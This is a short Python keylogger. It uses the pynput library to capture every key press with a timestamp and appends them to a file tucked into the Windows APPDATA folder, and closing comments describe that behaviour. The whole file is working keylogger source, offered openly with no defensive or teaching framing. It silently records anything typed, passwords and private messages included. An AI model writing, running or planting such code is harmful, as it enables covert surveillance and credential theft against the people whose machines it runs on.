from pynput import keyboard
from datetime import datetime
import os

log_file = os.path.join(os.getenv("APPDATA"), "keyfile.txt")

def keyPressed(key):
    try:
        with open(log_file, 'a') as logKey:
            logKey.write(f"{datetime.now()} - {key.char}\n")
    except AttributeError:
        with open(log_file, 'a') as logKey:
            logKey.write(f"{datetime.now()} - [{key}]\n")

if __name__ == "__main__":
    with keyboard.Listener(on_press=keyPressed) as listener:
        listener.join()
# This script logs key presses to a file in the user's APPDATA directory.
# It uses the pynput library to listen for keyboard events and writes them to a log file    